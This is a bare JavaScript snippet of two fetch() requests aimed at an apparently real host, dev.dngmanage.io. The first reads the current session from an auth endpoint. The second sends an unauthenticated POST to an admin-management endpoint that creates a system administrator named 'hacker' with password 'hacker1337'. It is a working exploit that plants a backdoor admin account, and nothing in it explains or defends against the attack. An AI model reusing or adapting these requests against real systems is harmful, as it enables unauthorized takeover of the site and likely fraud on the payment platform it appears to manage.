// get current user info and show it in console
fetch("https://dev.dngmanage.io/api/auth.php?action=check", {"headers": {"accept": "*/*","accept-language": "en-GB,en;q=0.9","sec-ch-ua": "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\"","sec-ch-ua-mobile": "?0","sec-ch-ua-platform": "\"Linux\"","sec-fetch-dest": "empty","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","sec-gpc": "1"},"body": null,"method": "GET","mode": "cors","credentials": "include"}).then(r => r.text().then(t => console.log(t)));

// create a new admin hacker:hacker1337
fetch("https://dev.dngmanage.io/api/admins_action.php", {
  "headers": {
    "content-type": "application/json",
    "sec-ch-ua": "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Linux\""
  },
  "referrer": "",
  "body": "{\"action\":\"add\",\"login\":\"hacker\",\"password\":\"hacker1337\",\"type\":\"system\",\"commission\":0,\"psp_id\":5}",
  "method": "POST",
  "mode": "cors",
  "credentials": "omit"
});
